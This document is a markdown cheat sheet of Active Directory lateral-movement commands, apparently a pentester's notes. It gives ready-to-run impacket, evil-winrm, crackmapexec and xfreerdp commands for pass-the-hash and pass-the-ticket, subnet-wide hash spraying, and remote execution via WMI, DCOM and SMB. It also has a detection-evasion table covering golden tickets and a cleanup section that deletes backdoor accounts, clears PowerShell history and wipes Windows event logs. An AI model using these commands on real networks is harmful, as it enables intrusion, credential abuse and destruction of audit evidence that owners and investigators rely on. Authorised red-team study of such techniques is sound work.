# AD Lateral Movement — Protocol × Credential Matrix

---

## Quick selection matrix

| Have | Target OS | SMB signing | Best method | Tool |
|------|-----------|-------------|-------------|------|
| Plaintext | Windows | any | WinRM or SMB | evil-winrm, impacket-wmiexec |
| NTLM hash | Windows | disabled | Pass-the-hash SMB | impacket-wmiexec -hashes |
| NTLM hash | Windows | enabled | Pass-the-hash WinRM | evil-winrm -H |
| Kerberos TGT | Windows | any | Pass-the-ticket | impacket -k -no-pass |
| Plaintext | Linux | — | SSH | ssh |
| NTLM hash | Linux | — | SSH (if key reuse) | unlikely — crack first |
| Kerberos ticket | Windows (admin) | any | WMI or SMBExec | impacket -k |

---

## SMB lateral movement patterns

```bash
# Test access
crackmapexec smb <target> -u user -p pass
crackmapexec smb <target> -u user -H :NTLMHASH

# Command execution variants (quietest to loudest)
impacket-wmiexec domain/user:pass@<target>            # WMI — no service/file created
impacket-smbexec domain/user:pass@<target>            # SMB named pipe exec
impacket-atexec domain/user:pass@<target> "cmd"       # scheduled task (auto-deleted)
impacket-psexec domain/user:pass@<target>             # SYSTEM via service creation (loud)

# Pass-the-hash
impacket-wmiexec -hashes :NTLM domain/user@<target>
impacket-psexec -hashes :NTLM domain/user@<target>

# Spray local admin hash across subnet
crackmapexec smb <subnet>/24 -u Administrator -H :NTLM --local-auth
```

---

## WinRM lateral movement patterns

```bash
# Port 5985 (HTTP) or 5986 (HTTPS)
evil-winrm -i <target> -u user -p pass
evil-winrm -i <target> -u user -H <ntlm_hash>   # pass-the-hash

# Upload/download files
evil-winrm> upload /local/file.exe C:\Windows\Temp\file.exe
evil-winrm> download C:\path\file.txt /local/

# Load PowerShell modules
evil-winrm -i <target> -u user -p pass -s /path/to/scripts/
evil-winrm> PowerSploit.ps1   # load from scripts dir

# Run with Kerberos ticket
evil-winrm -i <target> -u user -r domain.local -k   # requires /etc/krb5.conf set
```

---

## RDP lateral movement patterns

```bash
# xfreerdp
xfreerdp /u:user /p:pass /v:<target>
xfreerdp /u:user /pth:<ntlm_hash> /v:<target>    # restricted admin mode (RDP PTH)
xfreerdp /u:user /p:pass /v:<target> /dynamic-resolution /drive:share,/tmp/

# Enable restricted admin on target (requires existing admin access)
impacket-wmiexec domain/user:pass@<target> "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
```

---

## DCOM lateral movement

More stealthy than SMBExec/PSExec — uses Windows COM infrastructure.

```bash
# impacket dcomexec
impacket-dcomexec domain/user:pass@<target>
impacket-dcomexec -object MMC20 domain/user:pass@<target>

# Objects: MMC20 (default), ShellWindows, ShellBrowserWindow
# MMC20: most compatible; ShellWindows: requires interactive session
```

---

## WMI lateral movement

```powershell
# From Windows — standard WMI exec
Invoke-WmiMethod -ComputerName <target> -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c <cmd>" -Credential $cred

# wmicexec via impacket (Linux)
impacket-wmiexec domain/user:pass@<target> "powershell -enc <b64_cmd>"
```

---

## Detection signatures to avoid

| Method | Detection source | Avoid by |
|--------|-----------------|----------|
| PSExec | Service creation + ADMIN$ write | Use WMIExec instead |
| WMIExec | WMI event 4688 + unusual parent | Time writes to low-traffic hours |
| Rubeus in memory | LSASS access, unusual process | Use Rubeus from trusted parent |
| BloodHound full collection | LDAP query volume | Use stealth mode `-c DCOnly` first |
| Responder | NBT-NS / MDNS responses | Ensure authorized scope |
| Golden ticket | TGT with unusual lifetime, wrong RC4 etype | Use AES256 ticket, match normal lifetime |

---

## Cleaning up after lateral movement

```powershell
# Remove added local accounts
net user backdoor /delete
Remove-LocalUser -Name "backdoor"

# Remove registry persistence
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /f

# Clear PowerShell history
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# Clear event logs (if authorized)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
```
